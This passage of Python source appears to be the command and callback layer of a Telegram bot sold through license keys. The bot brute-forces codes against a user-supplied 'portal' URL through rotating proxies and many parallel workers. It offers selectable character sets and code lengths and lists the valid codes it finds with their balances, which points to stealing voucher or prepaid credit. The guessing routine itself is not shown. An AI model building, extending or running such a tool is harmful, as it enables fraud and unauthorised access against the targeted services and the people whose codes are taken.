    pc = user_proxy_checks.get(user_id)
    if pc and pc.get('stop_event'):
        pc['stop_event'].set()
        stopped = True
    if stopped:
        await update.message.reply_text("🛑 Stopped.")
    else:
        await update.message.reply_text("ℹ️ Nothing running.")

# ==================== /rearrange ====================
async def rearrange_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await send_rearranged_codes(context, user_id, ascending=True)

# ==================== /manageurls ====================
@admin_only
async def manageurls_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = load_user_portals(user_id)
    if not data["urls"]:
        await update.message.reply_text(
            "📂 <b>No saved URLs yet.</b>",
            reply_markup=get_manage_urls_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )
        return
    active = data.get("active")
    lines = [f"📂 <b>Saved URLs ({len(data['urls'])})</b>\n"]
    for i, u in enumerate(data["urls"], 1):
        marker = "🎯" if u["name"] == active else "  "
        lines.append(f"{marker} <b>{i}. {escape_html(u['name'])}</b>\n<code>{escape_html(u['url'])}</code>\n")
    text = "\n".join(lines)
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await update.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, reply_markup=get_manage_urls_keyboard(user_id), parse_mode=ParseMode.HTML)

# ==================== /admin ====================
@admin_only
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔐 <b>Admin Panel</b>",
        reply_markup=get_admin_main_keyboard(),
        parse_mode=ParseMode.HTML
    )


@admin_only
async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = len(user_scanners)
    active_scans = sum(1 for d in user_scanners.values() if d.get('task') and not d['task'].done())
    keys_data = load_keys()
    total_keys = len(keys_data.get("keys", {}))
    await update.message.reply_text(
        f"📊 <b>Stats</b>\n👥 Users: {users}\n🔍 Active scans: {active_scans}\n🔑 Total keys: {total_keys}",
        parse_mode=ParseMode.HTML
    )


@admin_only
async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_users().get("users", {})
    if not users:
        await update.message.reply_text("👥 No registered users.")
        return
    lines = [f"👥 <b>Registered Users ({len(users)})</b>\n"]
    for uid, info in list(users.items())[:50]:
        lines.append(
            f"🆔 <code>{uid}</code>\n"
            f"   📋 {escape_html(info.get('plan', '?'))}\n"
            f"   ⏰ {escape_html(info.get('expires_at', '?')[:16])}"
        )
    text = "\n".join(lines)
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await update.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)


@admin_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("Usage: /broadcast [message]")
        return
    msg = args[1]
    count = 0
    for uid in list(user_scanners.keys()):
        try:
            await context.bot.send_message(uid, f"📢 <b>ADMIN</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            count += 1
            await asyncio.sleep(0.1)
        except Exception:
            continue
    await update.message.reply_text(f"✅ Sent to {count} users.")


@admin_only
async def portal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("Usage: /portal [url]")
        return
    url = args[1].strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ URL must start with http/https")
        return
    ud['pending_portal_url'] = url
    ud['state'] = 'waiting_for_portal_name'
    await update.message.reply_text("✅ URL received.\n\n💬 Give it a name:")

# (Item 21) /setworkers stub — prefers button flow.
@admin_only
async def setworkers_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Alias — tells the admin to use the button flow."""
    await update.message.reply_text(
        "👷 Use the <b>👷 User Workers</b> button instead.",
        parse_mode=ParseMode.HTML
    )

# ==================== KEY COMMANDS ====================
@admin_only
async def genkey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = update.message.text.split()
    if len(args) < 4:
        await update.message.reply_text(
            "Usage: /genkey <plan|duration> <code_limit> <telegram_id>\n"
            "Example: /genkey 30d 5000 123456789\n"
            "         /genkey unlimited 99999 123456789"
        )
        return
    plan, code_limit_str, target_user = args[1], args[2], args[3]
    try:
        code_limit = int(code_limit_str)
    except ValueError:
        await update.message.reply_text("❌ code_limit must be a number.")
        return
    if not target_user.isdigit():
        await update.message.reply_text("❌ telegram_id must be numeric.")
        return

    key = create_key_record(plan, code_limit, target_user)
    if not key:
        await update.message.reply_text("❌ Invalid plan/duration. Try 30m, 1h, 1d, 7d, 1m, 1y, unlimited, or 5d/12h/2mo.")
        return
    expiry = make_expiry(plan)
    await update.message.reply_text(
        f"✅ Key Generated\n\n"
        f"🔑 KEY: <code>{key}</code>\n"
        f"👤 USER ID: <code>{target_user}</code>\n"
        f"📋 PLAN: {escape_html(plan)}\n"
        f"🔢 CODE LIMIT: {code_limit}\n"
        f"⏰ EXPIRES: <code>{expiry}</code>",
        parse_mode=ParseMode.HTML
    )
    try:
        await context.bot.send_message(
            int(target_user),
            f"🎫 <b>Your Key</b>\n\n"
            f"🔑 <code>{key}</code>\n"
            f"📋 Plan: {escape_html(plan)}\n"
            f"⏰ Expires: <code>{expiry}</code>\n\n"
            f"Redeem with: <code>/key {key}</code>",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass


# (Item 6) Reusable list keys text builder.
def build_listkeys_text():
    data = load_keys()
    keys = data.get("keys", {})
    if not keys:
        return "📋 No keys generated yet."
    lines = [f"🔑 <b>Keys ({len(keys)})</b>\n"]
    for key, info in list(keys.items())[:60]:
        used_by = info.get("used_by") or info.get("assigned_to") or "Unused"
        try:
            exp = datetime.fromisoformat(info["expires_at"])
            rem = exp - now_mm().astimezone(timezone.utc)
            rem_str = "expired" if rem.total_seconds() <= 0 else f"{rem.days}d left"
        except Exception:
            rem_str = "?"
        lines.append(
            f"🔑 <code>{key}</code>\n"
            f"   👤 {escape_html(str(used_by))}\n"
            f"   📋 {escape_html(info.get('plan', '?'))}\n"
            f"   🔢 {info.get('used_codes', 0)}/{info.get('code_limit', 0)}\n"
            f"   ⏰ {rem_str}"
        )
    return "\n".join(lines)


@admin_only
async def listkeys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = build_listkeys_text()
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await update.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)


@admin_only
async def delkey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("Usage: /delkey JAZZ-XXXX-XXXX-XXXX\n   or: /delkey <user_id>")
        return
    target = args[1].strip()
    keys_data = load_keys()
    users_data = load_users()
    removed = []

    if target in keys_data.get("keys", {}):
        del keys_data["keys"][target]
        save_keys(keys_data)
        removed.append(f"key {target}")

    if target.isdigit():
        if target in users_data.get("users", {}):
            del users_data["users"][target]
            save_users(users_data)
            removed.append(f"user {target}")
            user_scanners.pop(int(target), None)

    if removed:
        await update.message.reply_text("✅ Deleted: " + ", ".join(removed))
    else:
        await update.message.reply_text("❌ Not found.")


async def key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("Usage: /key JAZZ-XXXX-XXXX-XXXX")
        return
    key_str = args[1].strip()
    ok, info = redeem_key(user_id, key_str)
    if not ok:
        await update.message.reply_text(str(info))
        return
    expiry = info.get("expires_at", "?")[:16]
    await update.message.reply_text(
        f"✅ <b>PAID USER Activated!</b>\n\n"
        f"🔑 Key: <code>{escape_html(key_str)}</code>\n"
        f"📋 Plan: {escape_html(info.get('plan', '?'))}\n"
        f"⏰ Expires: <code>{expiry}</code>\n\n"
        f"🚀 Send /start to begin.",
        parse_mode=ParseMode.HTML
    )


async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    if not ud['portal_url']:
        await update.message.reply_text("❌ No Portal URL. Use /portal first.")
        return
    pm_check = get_proxy_manager(user_id)
    pt_check, _ = pm_check.stats()
    if pt_check == 0:
        await update.message.reply_text(
            "⛔ No proxies loaded. Load your own proxies first.",
            parse_mode=ParseMode.HTML
        )
        return
    await update.message.reply_text("🚀 Use 🚀 Start Scanner button.")


async def result_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    if not ud['valid_codes']:
        await update.message.reply_text("📋 No codes yet.")
        return
    lines = [f"📋 <b>Codes ({len(ud['valid_codes'])})</b>\n"]
    for c in ud['valid_codes'][:100]:
        lines.append(f"🎫 <code>{escape_html(c['code'])}</code> | {escape_html(c.get('balance_str', 'N/A'))}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def recheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔄 Use /rearrange for sorted view.")

# ==================== CALLBACK HANDLER ====================
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    # (Item 15/16) Worker preset callbacks — admin only.
    if data.startswith("wk_set_") or data.startswith("wk_cancel_"):
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Admin only.", show_alert=True)
            return

        if data.startswith("wk_cancel_"):
            try:
                await query.message.edit_text("❌ Cancelled.", reply_markup=None)
            except Exception:
                pass
            await query.answer("Cancelled")
            return

        # wk_set_<target>_<count>
        try:
            _, _, target_str, count_str = data.split("_", 3)
            target = int(target_str)
            new_n = int(count_str)
        except Exception:
            await query.answer("Invalid payload", show_alert=True)
            return

        if new_n not in (50, 100, 200, 300):
            await query.answer("Invalid count", show_alert=True)
            return

        # 1. Stop target's scanner
        target_ud = get_user_data(target)
        if target_ud.get('task') and not target_ud['task'].done():
            target_ud['stop_event'].set()
            target_ud['dash_update_event'].set()
            try:
                target_ud['task'].cancel()
            except Exception:
                pass

        # 2. Apply
        target_ud['num_workers'] = new_n
        try:
            with open(f"workers_{target}.txt", "w") as f:
                f.write(str(new_n))
        except Exception:
            pass

        # 3. Edit admin message
        try:
            await query.message.edit_text(
                f"✅ <b>Workers set to {new_n}</b> for <code>{target}</code>.\n"
                f"🔻 Scanner stopped (if running).",
                parse_mode=ParseMode.HTML, reply_markup=None
            )
        except Exception:
            pass
        await query.answer(f"✅ Workers = {new_n}")

        # 4. Notify target
        try:
            await context.bot.send_message(
                int(target),
                "⚠️ <b>Admin updated your workers.</b>\n\n"
                "🛑 Scanner auto-stopped.\n"
                f"👷 New worker count: <code>{new_n}</code>\n\n"
                "Send /start to see the menu and start again.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"[WorkerNotify] failed for {target}: {e}")

        # 5. Log
        try:
            admin_name = safe_username(
                update.effective_user.first_name
                or update.effective_user.username or "Admin", 20
            )
            await context.bot.send_message(
                chat_id=LOG_GROUP_ID,
                text=(
                    f"👷 <b>WORKERS UPDATED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 Admin: <code>{escape_html(admin_name)}</code>\n"
                    f"🆔 Admin ID: <code>{user_id}</code>\n"
                    f"🎯 Target: <code>{target}</code>\n"
                    f"👷 New workers: <code>{new_n}</code>\n"
                    f"⏰ {mm_datetime_str('%Y-%m-%d %H:%M:%S')}"
                ),
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        return

    # Admin-only callback guard
    if data.startswith("admin_") and user_id not in ADMIN_IDS:
        await query.answer("⛔ Admin only.", show_alert=True)
        return

    if data.startswith("set_mode_"):
        sel = data.split("set_mode_")[1]
        if sel == "num6":
            ud.update({'mode': 'num6', 'char_set': '012345678', 'code_len': 6, 'start_digit': None})
        elif sel == "num7":
            ud.update({'mode': 'num7', 'char_set': '012345678', 'code_len': 7, 'start_digit': None})
        elif sel == "num8":
            ud.update({'mode': 'num8', 'char_set': '012345678', 'code_len': 8, 'start_digit': None})
        elif sel == "num9":
            ud.update({'mode': 'num9', 'char_set': '012345678', 'code_len': 9, 'start_digit': None})
        elif sel == "abc6":
            ud.update({'mode': 'abc6', 'char_set': 'abcdefghijkmnpqrstuvwxyz', 'code_len': 6, 'start_digit': None})
        elif sel == "eng7":
            ud.update({'mode': 'eng7', 'char_set': string.ascii_lowercase, 'code_len': 7, 'start_digit': None})
        elif sel == "mix6":
            ud.update({'mode': 'mix6', 'char_set': '2345678abcdefghijkmnpqrstuvwxyz', 'code_len': 6, 'start_digit': None})
        elif sel == "mix7":
            ud.update({'mode': 'mix7', 'char_set': '2345678abcdefghijkmnpqrstuvwxyz', 'code_len': 7, 'start_digit': None})
        elif sel == "mix8":
            ud.update({'mode': 'mix8', 'char_set': '2345678abcdefghijkmnpqrstuvwxyz', 'code_len': 8, 'start_digit': None})
        elif sel == "mix9":
            ud.update({'mode': 'mix9', 'char_set': '2345678abcdefghijkmnpqrstuvwxyz', 'code_len': 9, 'start_digit': None})
        elif sel == "custom":
            ud.update({'mode': 'custom', 'char_set': '012345678', 'code_len': 6})
            ud['state'] = 'waiting_for_digit'
            await query.message.edit_text("🔢 Send a single start digit:")
            return
        try:
            await query.message.edit_text(
                f"✅ Mode: <code>{ud['mode']}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

    elif data == "proxy_check_auto":
        await query.message.edit_text("⏳ Starting proxy check...")
        asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))

    elif data == "proxy_check_stop":
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('stop_event'):
            pc['stop_event'].set()

    elif data == "proxy_clear_file":
        pm = get_proxy_manager(user_id)
        pm.clear_file()
        await query.message.edit_text(f"🗑 Cleared {pm.file_path}")

    elif data == "stop_scan":
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        if ud['task'] and not ud['task'].done():
            ud['task'].cancel()

    elif data == "show_result":
        if not ud['valid_codes']:
            await query.message.reply_text("📋 No codes yet.")
        else:
            lines = [f"📋 <b>Codes ({len(ud['valid_codes'])})</b>\n"]
            for c in ud['valid_codes'][:50]:
                lines.append(f"🎫 <code>{escape_html(c['code'])}</code> | {escape_html(c.get('balance_str', 'N/A'))}")
            await query.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

    elif data == "recheck":
        await query.message.reply_text("🔄 Use /rearrange for full view.")

    elif data == "back_to_menu":
        kb = get_admin_reply_keyboard() if user_id in ADMIN_IDS else get_user_reply_keyboard()
        await query.message.reply_text("🔙 Use /start", reply_markup=kb)

    elif data == "rearrange_codes" or data == "rearrange_codes_live":
        ctx = ud.get('context') or context
        await send_rearranged_codes(ctx, user_id, ascending=True)

    elif data == "manage_urls_list":
        data_json = load_user_portals(user_id)
        if not data_json["urls"]:
            await query.message.reply_text("📂 No URLs.", reply_markup=get_manage_urls_keyboard(user_id))
            return
        active = data_json.get("active")
        lines = [f"📂 <b>Saved ({len(data_json['urls'])})</b>\n"]
        for i, u in enumerate(data_json["urls"], 1):
            marker = "🎯" if u["name"] == active else "  "
            lines.append(f"{marker} <b>{i}. {escape_html(u['name'])}</b>\n<code>{escape_html(u['url'])}</code>\n")
        text = "\n".join(lines)
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                await query.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
        else:
            await query.message.reply_text(text, reply_markup=get_manage_urls_keyboard(user_id), parse_mode=ParseMode.HTML)

    elif data == "manage_urls_set":
        data_json = load_user_portals(user_id)
        if not data_json["urls"]:
            await query.message.reply_text("📂 No URLs.")
            return
        buttons = [[InlineKeyboardButton(text=f"🎯 {u['name']}", callback_data=f"manage_urls_use_{i}")] for i, u in enumerate(data_json["urls"])]
        buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")])
        await query.message.reply_text("Choose active:", reply_markup=InlineKeyboardMarkup(buttons))

    elif data == "manage_urls_delete":
        data_json = load_user_portals(user_id)
        if not data_json["urls"]:
            await query.message.reply_text("📂 No URLs.")
            return
        buttons = [[InlineKeyboardButton(text=f"🗑️ {u['name']}", callback_data=f"manage_urls_del_{u['name']}")] for u in data_json["urls"]]
        buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")])
        await query.message.reply_text("Choose to delete:", reply_markup=InlineKeyboardMarkup(buttons))

    elif data.startswith("manage_urls_use_"):
        idx = int(data.replace("manage_urls_use_", ""))
        data_json = load_user_portals(user_id)
        if 0 <= idx < len(data_json["urls"]):
            name = data_json["urls"][idx]["name"]
            if set_active_portal(user_id, name):
                ud['portal_url'] = data_json["urls"][idx]["url"]
                await query.message.reply_text(
                    f"✅ Active: <b>{escape_html(name)}</b>",
                    parse_mode=ParseMode.HTML
                )

    elif data.startswith("manage_urls_del_"):
        name = data.replace("manage_urls_del_", "")
        if delete_user_portal(user_id, name):
            await query.message.reply_text(
                f"🗑️ Deleted <b>{escape_html(name)}</b>",
                parse_mode=ParseMode.HTML
            )

    elif data.startswith("admin_"):
        if data == "admin_back":
            try:
                await query.message.edit_text(
                    "🔐 <b>Admin Panel</b>",
                    reply_markup=get_admin_main_keyboard(),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        elif data == "admin_genkey":
            try:
                await query.message.edit_text(
                    "🔑 <b>Select Plan</b>",
                    reply_markup=get_admin_genkey_keyboard(),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        elif data.startswith("admin_gen_"):
            plan = data.replace("admin_gen_", "")
            ud['admin_gen_plan'] = plan
            await query.message.reply_text(
                f"Use: <code>/genkey {plan} [limit] [user_id]</code>",
                parse_mode=ParseMode.HTML
            )
        elif data == "admin_listkeys":
            text = build_listkeys_text()
            if len(text) > 4000:
                for i in range(0, len(text), 4000):
                    await query.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
            else:
                await query.message.reply_text(text, parse_mode=ParseMode.HTML)
        elif data == "admin_stats":
            users = len(user_scanners)
            active_scans = sum(1 for d in user_scanners.values() if d.get('task') and not d['task'].done())
            total_keys = len(load_keys().get("keys", {}))
            await query.message.reply_text(
                f"📊 <b>Stats</b>\n"
                f"👥 Users: {users}\n"
                f"🔍 Active scans: {active_scans}\n"
                f"🔑 Total keys: {total_keys}",
                parse_mode=ParseMode.HTML
            )
        elif data == "admin_broadcast":
            await query.message.reply_text("📢 Use /broadcast [msg]")
        elif data == "admin_users":
            users = load_users().get("users", {})
            if not users:
                await query.message.reply_text("👥 No registered users.")
            else:
                lines = [f"👥 <b>Registered Users ({len(users)})</b>\n"]
                for uid, info in list(users.items())[:50]:
                    lines.append(
                        f"🆔 <code>{uid}</code>\n"
                        f"   📋 {escape_html(info.get('plan', '?'))}\n"
                        f"   ⏰ {escape_html(info.get('expires_at', '?')[:16])}"
                    )
                text = "\n".join(lines)
                for i in range(0, len(text), 4000):
                    await query.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
        elif data == "admin_delkey":
            await query.message.reply_text(
                "🗑️ Send:\n<code>/delkey JAZZ-XXXX-XXXX-XXXX</code>\n"
                "or:\n<code>/delkey &lt;user_id&gt;</code>",
                parse_mode=ParseMode.HTML
            )
        elif data == "admin_set_user_workers":
            ud['state'] = 'waiting_for_target_user_id'
            await query.message.reply_text(
                "👷 <b>Set Workers for a User</b>\n\n"
                "Send the target user's Telegram ID:",
                parse_mode=ParseMode.HTML
            )

# ==================== TEXT HANDLER ====================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user is None or update.message is None:
            return
        user_id = update.effective_user.id
    except Exception:
        return
    ud = get_user_data(user_id)
    state = ud.get('state')
    text = (update.message.text or "").strip()
    if len(text) > 50000:
        text = text[:50000]
        await update.message.reply_text("⚠️ Truncated.")
        return
    if text in REPLY_BUTTONS:
        await handle_reply_button(update, context)
        return

    # (Item 13) Target ID received → show preset keyboard.
    if state == 'waiting_for_target_user_id':
        if not text.isdigit():
            await update.message.reply_text("❌ Telegram ID must be numeric.")
            return
        target = int(text)
        current = get_user_data(target).get('num_workers', USER_WORKERS)
        ud['state'] = None
        await update.message.reply_text(
            f"👷 <b>Target:</b> <code>{target}</code>\n"
            f"<b>Current workers:</b> <code>{current}</code>\n\n"
            f"Pick new worker count:",
            reply_markup=get_worker_preset_keyboard(target),
            parse_mode=ParseMode.HTML
        )
        return

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
            await update.message.reply_text("❌ URL must start with http/https")
            return
        ud['pending_portal_url'] = text
        ud['state'] = 'waiting_for_portal_name'
        await update.message.reply_text("✅ URL received.\n💬 Give it a name:")
    elif state == 'waiting_for_portal_name':
        name = text.strip()[:30]
        if not name:
            await update.message.reply_text("❌ Name cannot be empty.")
            return
        url = ud.get('pending_portal_url')
        if not url:
            ud['state'] = None
            return
        add_user_portal(user_id, name, url)
        set_active_portal(user_id, name)
        ud['portal_url'] = url
        ud['state'] = None
        ud['pending_portal_url'] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(url)
        except Exception:
            pass
        kb = get_admin_reply_keyboard() if user_id in ADMIN_IDS else get_user_reply_keyboard()
        await update.message.reply_text(
            f"✅ Saved as <b>{escape_html(name)}</b>",
            reply_markup=kb,
            parse_mode=ParseMode.HTML
        )
    elif state == 'waiting_for_digit':
        ud['start_digit'] = text if (text in ud['char_set'] and len(text) == 1) else '0'
        ud['state'] = None
        kb = get_admin_reply_keyboard() if user_id in ADMIN_IDS else get_user_reply_keyboard()
        await update.message.reply_text(
            f"✅ Start digit: <code>{ud['start_digit']}</code>",
            reply_markup=kb,
            parse_mode=ParseMode.HTML
        )
    elif state == 'waiting_for_workers':
        max_w = ADMIN_WORKERS if user_id in ADMIN_IDS else USER_WORKERS
        try:
            n = int(text)
            if 1 <= n <= max_w:
                ud['num_workers'] = n
                ud['state'] = None
                try:
                    with open(f"workers_{user_id}.txt", "w") as f:
                        f.write(str(n))
                except Exception:
                    pass
                kb = get_admin_reply_keyboard() if user_id in ADMIN_IDS else get_user_reply_keyboard()
                await update.message.reply_text(
                    f"✅ Workers: <code>{n}</code>",
                    reply_markup=kb,
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(f"❌ 1–{max_w} only.")
        except ValueError:
            await update.message.reply_text("❌ Number only.")

# ==================== MAIN ====================
def main():
    import logging
    logging.getLogger("telegram").setLevel(logging.WARNING)
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)

    # start_web_server()  # Enable only if deploying on Render/Railway

    bot_token = get_bot_token()
    # Preload admin's own proxy manager for log message.
    pm = get_proxy_manager(ADMIN_IDS[0] if ADMIN_IDS else 0)
    total, active = pm.stats()
    print(f"[MAIN] Admin IDs: {ADMIN_IDS}")
    print(f"[MAIN] Admin proxies: {active}/{total} ({pm.file_path})")
    print(f"[MAIN] User workers: {USER_WORKERS}, Admin workers: {ADMIN_WORKERS}")
    print(f"[MAIN] Log group: {LOG_GROUP_ID}")
    print("[MAIN] Per-user proxy files enabled")
    print("[MAIN] Success codes = live edited message")
    print("[MAIN] Rearrange = .txt file only")

    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("genkey", genkey_cmd))
    app.add_handler(CommandHandler("delkey", delkey_cmd))
    app.add_handler(CommandHandler("listkeys", listkeys_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("key", key_cmd))
    app.add_handler(CommandHandler("portal", portal_cmd))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("result", result_cmd))
    app.add_handler(CommandHandler("recheck", recheck_cmd))
    app.add_handler(CommandHandler("manageurls", manageurls_cmd))
    app.add_handler(CommandHandler("rearrange", rearrange_cmd))
    app.add_handler(CommandHandler("setworkers", setworkers_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot running...")
    app.run_polling()


if __name__ == "__main__":
    main()